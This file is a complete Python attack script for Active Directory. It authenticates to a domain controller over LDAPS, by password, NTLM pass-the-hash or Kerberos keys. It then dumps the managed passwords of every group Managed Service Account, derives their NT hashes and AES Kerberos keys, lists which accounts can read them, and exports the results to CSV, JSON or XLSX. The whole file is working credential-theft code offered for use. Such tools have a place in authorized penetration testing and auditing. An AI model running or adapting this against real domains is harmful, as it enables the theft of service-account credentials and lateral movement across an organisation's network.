#!/usr/bin/env python3
# gmsa_msldap.py — Dump gMSA passwords using msldap 0.5.15 (LDAPS only), no Impacket
#
# Target: domain.tld/username[:password]@OptionalDCFQDN_or_IP
#
# Auth:
#   -k         : Kerberos (try ccache first; then -aesKey; then -hashes (RC4/NT); then password)
#   -hashes    : LMHASH:NTHASH. With -k -> use NT as RC4 key; without -k -> NTLM pass-the-hash
#   -aesKey    : AES key (128/256-bit hex) for Kerberos
#   -no-pass   : Empty password for NTLM or rely on Kerberos ccache/keys
#
# Transport:
#   LDAPS only. Channel binding: --channel-binding {none, tls-server-end-point, tls-unique}
#   -dc-ip     : DC IP for Kerberos ?dc= (and as connect host if no DC FQDN/IP in target)
#
# Outputs:
#   --csv  <path>  : write CSV
#   --json <path>  : write JSON (pretty)
#   --xlsx <path>  : write XLSX (via openpyxl)
#
# Dependencies:
#   pip install msldap==0.5.15 pycryptodome openpyxl
#   (minikerberos is pulled in by msldap)

import argparse
import asyncio
import csv
import ipaddress
import json
import os
import re
import socket
import struct
import sys
from binascii import hexlify
from typing import Optional, Tuple, List, Dict
from urllib.parse import quote, urlencode

from Cryptodome.Hash import MD4
from msldap.commons.factory import LDAPConnectionFactory

# -------------------------- Target & helpers --------------------------

TARGET_RE = re.compile(
    r'^(?P<domain>[^/@:]+)\/(?P<username>[^@:]+)(:(?P<password>[^@]*))?(?:@(?P<dc>[^@]+))?$'
)
HEX_RE = re.compile(r'^[0-9a-fA-F]+$')

def parse_target(target: str):
    """
    Impacket-style: domain.tld/username[:password]@OptionalDCFQDN_or_IP
    Returns (domain_fqdn, username, password_or_None, dc_hint_or_None)
    """
    m = TARGET_RE.match(target)
    if not m:
        raise ValueError("Target must be 'domain.tld/username[:password]@OptionalDCFQDN_or_IP'")
    return m.group('domain'), m.group('username'), m.group('password'), m.group('dc')

def base_creator(domain_fqdn: str) -> str:
    return ','.join(f'DC={part}' for part in domain_fqdn.split('.'))

def validate_hashes(hashes: str):
    """
    -hashes expects LM:NT (both 32-hex)
    """
    if ':' not in hashes:
        raise ValueError("-hashes must be in LMHASH:NTHASH format")
    lm, nt = hashes.split(':', 1)
    if len(lm) != 32 or len(nt) != 32 or not HEX_RE.match(lm) or not HEX_RE.match(nt):
        raise ValueError("LM and NT must be 32 hex chars each")
    return lm.lower(), nt.lower()

def validate_aeskey(aeskey: str):
    """
    Accept 128-bit (32 hex) or 256-bit (64 hex) AES keys.
    Returns (key_hex_lower, key_bits)
    """
    if not HEX_RE.match(aeskey) or len(aeskey) not in (32, 64):
        raise ValueError("-aesKey must be 32 or 64 hex chars")
    return aeskey.lower(), 128 if len(aeskey) == 32 else 256

def is_ip(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except Exception:
        return False

def resolve_ip(host: str) -> Optional[str]:
    """
    Prefer IPv4 if available, else return the first address.
    """
    try:
        infos = socket.getaddrinfo(host, None)
        ipv4 = [i for i in infos if i[0] == socket.AF_INET]
        if ipv4:
            return ipv4[0][4][0]
        return infos[0][4][0] if infos else None
    except Exception:
        return None

# -------------------------- Minimal SD/ACL/SID parser (no Impacket) --------------------------

def parse_sid(data: bytes, offset: int) -> Tuple[str, int]:
    if offset + 8 > len(data):
        raise ValueError("SID too short")
    rev = data[offset]
    subcnt = data[offset + 1]
    ident_auth = int.from_bytes(data[offset + 2:offset + 8], 'big')
    pos = offset + 8
    subs = []
    for _ in range(subcnt):
        if pos + 4 > len(data):
            raise ValueError("SID sub-authority truncated")
        subs.append(int.from_bytes(data[pos:pos + 4], 'little'))
        pos += 4
    sid_str = f"S-{rev}-{ident_auth}" + ("" if not subs else "-" + "-".join(str(x) for x in subs))
    return sid_str, pos - offset

OBJECT_ACE_TYPES = {0x05, 0x06, 0x07, 0x08}  # *_OBJECT_ACE

def extract_sids_from_sd(sd: bytes) -> List[str]:
    """
    Very small parser that walks the DACL and returns SIDs from ACEs.
    Handles ACCESS_ALLOWED/ACCESS_DENIED and *_OBJECT variants.
    """
    sids: List[str] = []
    if len(sd) < 20 or sd[0] != 1:  # SD revision
        return sids
    dacl_off = int.from_bytes(sd[16:20], 'little')
    if dacl_off == 0 or dacl_off >= len(sd):
        return sids
    dacl = sd[dacl_off:]
    if len(dacl) < 8:
        return sids
    ace_count = int.from_bytes(dacl[4:6], 'little')
    pos = 8
    for _ in range(ace_count):
        if pos + 4 > len(dacl):
            break
        ace_type = dacl[pos]
        ace_size = int.from_bytes(dacl[pos+2:pos+4], 'little')
        if ace_size < 8 or pos + ace_size > len(dacl):
            break
        body = dacl[pos+4:pos+ace_size]
        bpos = 4  # skip ACCESS_MASK
        try:
            if ace_type in OBJECT_ACE_TYPES:
                if bpos + 4 > len(body):
                    raise ValueError
                obj_flags = int.from_bytes(body[bpos:bpos+4], 'little'); bpos += 4
                if obj_flags & 0x1:  # ACE_OBJECT_TYPE_PRESENT
                    bpos += 16
                if obj_flags & 0x2:  # ACE_INHERITED_OBJECT_TYPE_PRESENT
                    bpos += 16
            sid_str, _sidlen = parse_sid(body, bpos)
            sids.append(sid_str)
        except Exception:
            pass
        pos += ace_size
    return sids

# -------------------------- gMSA managed password blob parser --------------------------

def parse_gmsa_blob(data: bytes) -> dict:
    """
    Returns dict with CurrentPassword (bytes) and other slices.
    """
    if len(data) < 16:
        raise ValueError("msDS-ManagedPassword blob too short")
    Version, Reserved, Length, CurOff, PrevOff, QryOff, UnchOff = struct.unpack_from('<HHIHHHH', data, 0)
    out = {
        'Version': Version,
        'Reserved': Reserved,
        'Length': Length,
        'CurrentPasswordOffset': CurOff,
        'PreviousPasswordOffset': PrevOff,
        'QueryPasswordIntervalOffset': QryOff,
        'UnchangedPasswordIntervalOffset': UnchOff,
    }
    def sl(start: int, end: int) -> bytes:
        return data[start:end]
    end_curr = QryOff if PrevOff == 0 else PrevOff
    out['CurrentPassword'] = sl(CurOff, end_curr)
    out['PreviousPassword'] = b'' if PrevOff == 0 else sl(PrevOff, QryOff)
    out['QueryPasswordInterval'] = sl(QryOff, UnchOff)
    out['UnchangedPasswordInterval'] = data[UnchOff:]
    return out

# -------------------------- Kerberos AES s2k via minikerberos --------------------------

def aes_string_to_key(password_str: str, salt_str: str, bits: int) -> Optional[bytes]:
    """
    Uses minikerberos to derive AES keys. Returns raw key bytes or None.
    Tries multiple symbol names to handle version differences.
    """
    try:
        from minikerberos.protocol.constants import EncryptionType
        try:
            from minikerberos.protocol.encryption import _enctype_table as enctype_table
        except Exception:
            from minikerberos.protocol.encryption import enctype_table  # type: ignore
        etype = {
            128: getattr(EncryptionType, 'AES128_CTS_HMAC_SHA1_96', None),
            256: getattr(EncryptionType, 'AES256_CTS_HMAC_SHA1_96', None),
        }[bits]
        if etype is None:
            return None
        etype_id = etype.value if hasattr(etype, 'value') else int(etype)
        etype_cls = enctype_table[etype_id]
        key_obj = etype_cls.string_to_key(password_str, salt_str, None)
        for attr in ('contents', 'key', 'keyvalue'):
            v = getattr(key_obj, attr, None)
            if isinstance(v, (bytes, bytearray)):
                return bytes(v)
        if isinstance(key_obj, (bytes, bytearray)):
            return bytes(key_obj)
        return None
    except Exception:
        return None

# -------------------------- URL builder (LDAPS only) --------------------------

def build_msldap_url(
    *, auth: str, domain_fqdn: str, username: Optional[str], secret: Optional[str],
    base_dn: str, connect_host: str, dc_ip: Optional[str], channel_binding: str, include_dc: bool
) -> str:
    if username is None:
        netloc = connect_host
    else:
        userpart = f'{domain_fqdn}\\{username}'
        secpart = '' if secret is None else f':{quote(secret, safe="")}'
        netloc = f'{userpart}{secpart}@{connect_host}'
    path = f'/{base_dn}/'
    q = {}
    if include_dc and dc_ip:
        q['dc'] = dc_ip
    if channel_binding and channel_binding != 'none':
        q['channel_binding'] = channel_binding
    return f"ldaps+{auth}://{netloc}{path}" + (f"?{urlencode(q)}" if q else '')

async def try_connect(url: str):
    conn_url = LDAPConnectionFactory.from_url(url)
    client = conn_url.get_client()
    _, err = await client.connect()
    if err:
        raise err
    return client

async def connect_with_fallbacks(
    *, domain_fqdn: str, username: str, password: Optional[str],
    connect_host: str, dc_ip: Optional[str], hashes: Optional[str], aeskey: Optional[str],
    use_kerberos: bool, channel_binding: str, no_pass: bool
):
    base_dn = base_creator(domain_fqdn)
    attempts = []
    if use_kerberos:
        attempts.append(build_msldap_url(
            auth='kerberos-ccache', domain_fqdn=domain_fqdn, username=None, secret=None,
            base_dn=base_dn, connect_host=connect_host, dc_ip=dc_ip,
            channel_binding=channel_binding, include_dc=True
        ))
        if aeskey:
            attempts.append(build_msldap_url(
                auth='kerberos-aes', domain_fqdn=domain_fqdn, username=username, secret=aeskey,
                base_dn=base_dn, connect_host=connect_host, dc_ip=dc_ip,
                channel_binding=channel_binding, include_dc=True
            ))
        if hashes:
            _lm, nt = validate_hashes(hashes)
            attempts.append(build_msldap_url(
                auth='kerberos-rc4', domain_fqdn=domain_fqdn, username=username, secret=nt,
                base_dn=base_dn, connect_host=connect_host, dc_ip=dc_ip,
                channel_binding=channel_binding, include_dc=True
            ))
        if password is not None:
            attempts.append(build_msldap_url(
                auth='kerberos-password', domain_fqdn=domain_fqdn, username=username, secret=password,
                base_dn=base_dn, connect_host=connect_host, dc_ip=dc_ip,
                channel_binding=channel_binding, include_dc=True
            ))
    else:
        if hashes:
            _lm, nt = validate_hashes(hashes)
            attempts.append(build_msldap_url(
                auth='ntlm-nt', domain_fqdn=domain_fqdn, username=username, secret=nt,
                base_dn=base_dn, connect_host=connect_host, dc_ip=None,
                channel_binding=channel_binding, include_dc=False
            ))
        if password is not None or no_pass:
            ntlm_secret = '' if (password is None and no_pass) else password
            attempts.append(build_msldap_url(
                auth='ntlm-password', domain_fqdn=domain_fqdn, username=username, secret=ntlm_secret,
                base_dn=base_dn, connect_host=connect_host, dc_ip=None,
                channel_binding=channel_binding, include_dc=False
            ))

    last_err = None
    for url in attempts:
        try:
            return await try_connect(url)
        except Exception as e:
            last_err = e
    raise last_err if last_err else RuntimeError("No authentication method was attempted")

# -------------------------- Output helpers --------------------------

def write_csv(path: str, rows: List[Dict[str, str]]) -> None:
    if not rows:
        return
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    # Stable column order
    cols = [
        "domain", "dc_host", "dc_ip", "samAccountName",
        "nt_hash", "aes256", "aes128",
        "readers", "reader_sids"
    ]
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=cols, extrasaction="ignore")
        w.writeheader()
        for r in rows:
            w.writerow(r)

def write_json(path: str, rows: List[Dict[str, str]]) -> None:
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(rows, f, indent=2, ensure_ascii=False)

def write_xlsx(path: str, rows: List[Dict[str, str]]) -> None:
    if not rows:
        return
    os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
    try:
        from openpyxl import Workbook
    except ImportError as e:
        raise SystemExit(f"openpyxl is required for --xlsx output: {e}")
    wb = Workbook()
    ws = wb.active
    ws.title = "gMSA"
    cols = [
        "domain", "dc_host", "dc_ip", "samAccountName",
        "nt_hash", "aes256", "aes128",
        "readers", "reader_sids"
    ]
    ws.append(cols)
    for r in rows:
        ws.append([r.get(c, "") for c in cols])
    wb.save(path)

# -------------------------- Main enumeration --------------------------

async def enumerate_gmsa(args):
    try:
        domain_fqdn, username, tgt_password, target_dc = parse_target(args.target)
    except Exception as e:
        print(f"[!] Invalid target: {e}")
        sys.exit(1)

    if tgt_password is None and not (args.no_pass or args.k or args.hashes or args.aesKey):
        print("Either specify a password in the target or use -no-pass (or provide -k/-hashes/-aesKey).")
        sys.exit(1)

    aeskey = None
    if args.aesKey:
        try:
            aeskey, _ = validate_aeskey(args.aesKey)
        except Exception as e:
            print(f"[!] {e}")
            sys.exit(1)

    hashes = args.hashes

    # Choose connect host and DC IP
    # Priority for connect_host:
    #   1) @OptionalDCFQDN_or_IP in target (honor what user set)
    #   2) -dc-ip (works when DNS is broken)
    #   3) domain FQDN
    connect_host = target_dc or (args.dc_ip if args.dc_ip else domain_fqdn)

    # Kerberos requires a DC IP in the URL (?dc=). Use -dc-ip if given; else resolve.
    dc_ip = None
    if args.k:
        dc_ip = args.dc_ip or (connect_host if is_ip(connect_host) else resolve_ip(connect_host))
        if not dc_ip:
            print("[!] Kerberos selected (-k) but no DC IP is available (DNS failed and no -dc-ip).")
            sys.exit(1)

    # Connect
    try:
        client = await connect_with_fallbacks(
            domain_fqdn=domain_fqdn, username=username, password=tgt_password,
            connect_host=connect_host, dc_ip=dc_ip, hashes=hashes, aeskey=aeskey,
            use_kerberos=args.k, channel_binding=args.channel_binding, no_pass=args.no_pass,
        )
    except Exception as e:
        print(f"Connection failed: {e}")
        sys.exit(1)

    # Results to export
    results: List[Dict[str, str]] = []

    # Query
    query = '(&(objectClass=msDS-GroupManagedServiceAccount))'
    attrs = ['sAMAccountName', 'msDS-GroupMSAMembership', 'msDS-ManagedPassword']  # LDAPS only
    try:
        async for entry in client.pagedsearch(query=query, attributes=attrs):
            raw = entry.get('raw_attributes') or {}
            ad = entry.get('attributes') or {}

            sam = ad.get('sAMAccountName')
            if isinstance(sam, list):
                sam = sam[0]
            if not sam:
                continue

            # Readers (names + sids)
            reader_names: List[str] = []
            reader_sids: List[str] = []
            acl_bytes = None
            if 'msDS-GroupMSAMembership' in raw and raw['msDS-GroupMSAMembership']:
                v = raw['msDS-GroupMSAMembership']
                acl_bytes = v[0] if isinstance(v, (list, tuple)) else v
            if acl_bytes:
                try:
                    for sid in extract_sids_from_sd(acl_bytes):
                        reader_sids.append(sid)
                        async for who in client.pagedsearch(
                            query=f'(&(objectSid={sid}))', attributes=['sAMAccountName']
                        ):
                            wad = who.get('attributes') or {}
                            who_sam = wad.get('sAMAccountName')
                            if isinstance(who_sam, list):
                                who_sam = who_sam[0]
                            if who_sam:
                                reader_names.append(who_sam)
                            break
                except Exception as e:
                    print(f'  [!] Failed to parse ACL for {sam}: {e}')

            # Managed password -> hashes/keys
            nthash_hex = ""
            aes128_hex = ""
            aes256_hex = ""
            mp = raw.get('msDS-ManagedPassword')
            if mp:
                data = mp[0] if isinstance(mp, (list, tuple)) else mp
                try:
                    blob = parse_gmsa_blob(data)
                    currentPassword = blob['CurrentPassword'][:-2]  # strip trailing nulls (UTF-16LE)

                    md4 = MD4.new()
                    md4.update(currentPassword)
                    nthash_hex = hexlify(md4.digest()).decode('utf-8')

                    pw_str = currentPassword.decode('utf-16-le', 'replace')
                    salt = f"{domain_fqdn.upper()}host{sam[:-1].lower()}.{domain_fqdn.lower()}"
                    aes128 = aes_string_to_key(pw_str, salt, 128)
                    aes256 = aes_string_to_key(pw_str, salt, 256)
                    if aes256:
                        aes256_hex = hexlify(aes256).decode("utf-8")
                    if aes128:
                        aes128_hex = hexlify(aes128).decode("utf-8")
                except Exception as e:
                    print(f'  [!] Failed to parse msDS-ManagedPassword for {sam}: {e}')

            # Print to console (same as before)
            print(f'Users or groups who can read password for {sam}:')
            for n in sorted(set(reader_names)):
                print(f' > {n}')
            if nthash_hex:
                print(f'{sam}:::{nthash_hex}')
            if aes256_hex:
                print(f'{sam}:aes256-cts-hmac-sha1-96:{aes256_hex}')
            if aes128_hex:
                print(f'{sam}:aes128-cts-hmac-sha1-96:{aes128_hex}')

            # Collect for export
            results.append({
                "domain": domain_fqdn,
                "dc_host": connect_host,
                "dc_ip": dc_ip or "",
                "samAccountName": sam,
                "nt_hash": nthash_hex,
                "aes256": aes256_hex,
                "aes128": aes128_hex,
                "readers": "; ".join(sorted(set(reader_names))),
                "reader_sids": "; ".join(sorted(set(reader_sids))),
            })

    finally:
        try:
            await client.close()
        except Exception:
            pass

    if not results:
        print('No gMSAs returned.')

    # Exports
    if args.out_csv:
        write_csv(args.out_csv, results)
        print(f'[+] CSV written: {os.path.abspath(args.out_csv)}')
    if args.out_json:
        write_json(args.out_json, results)
        print(f'[+] JSON written: {os.path.abspath(args.out_json)}')
    if args.out_xlsx:
        write_xlsx(args.out_xlsx, results)
        print(f'[+] XLSX written: {os.path.abspath(args.out_xlsx)}')

# -------------------------- CLI --------------------------

def main():
    p = argparse.ArgumentParser(
        description='Dump gMSA Passwords (msldap 0.5.15, LDAPS-only, Impacket-free)'
    )
    p.add_argument('target', help="domain.tld/username[:password]@OptionalDCFQDN_or_IP")
    p.add_argument('-no-pass', dest='no_pass', action='store_true',
                   help='No password for NTLM, or rely on Kerberos ccache/keys with -k')
    p.add_argument('-hashes', metavar='LMHASH:NTHASH',
                   help='LM:NT. With -k: use NT as Kerberos RC4 key; without -k: NTLM pass-the-hash')
    p.add_argument('-k', action='store_true',
                   help='Use Kerberos. Try ccache first; then -aesKey; then -hashes (RC4); then password')
    p.add_argument('-aesKey', help='AES key (hex) for Kerberos (128/256-bit)')
    p.add_argument('--channel-binding',
                   choices=['none', 'tls-server-end-point', 'tls-unique'],
                   default='tls-server-end-point',
                   help='TLS channel binding (default: tls-server-end-point)')
    p.add_argument('-dc-ip', dest='dc_ip',
                   help='Domain Controller IP (used for Kerberos ?dc=; also used as connect host if no DC in target)')
    # New output flags
    p.add_argument('--csv', dest='out_csv', help='Write results to CSV file')
    p.add_argument('--json', dest='out_json', help='Write results to JSON file')
    p.add_argument('--xlsx', dest='out_xlsx', help='Write results to XLSX file')
    args = p.parse_args()
    asyncio.run(enumerate_gmsa(args))

if __name__ == "__main__":
    main()
